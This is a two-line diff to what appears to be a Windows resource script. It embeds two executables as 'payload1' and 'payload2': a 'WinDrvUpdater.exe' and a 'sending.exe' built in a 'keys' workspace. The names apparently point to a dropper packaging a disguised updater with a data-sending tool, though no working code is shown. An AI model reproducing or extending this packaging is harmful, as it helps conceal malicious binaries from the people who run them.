@@ -1,0 +1,2 @@
+payload1 RCDATA "/workspaces/keys/Update/src/assets/WinDrvUpdater.exe"
+payload2 RCDATA "/workspaces/keys/target/x86_64-pc-windows-gnu/release/sending.exe"
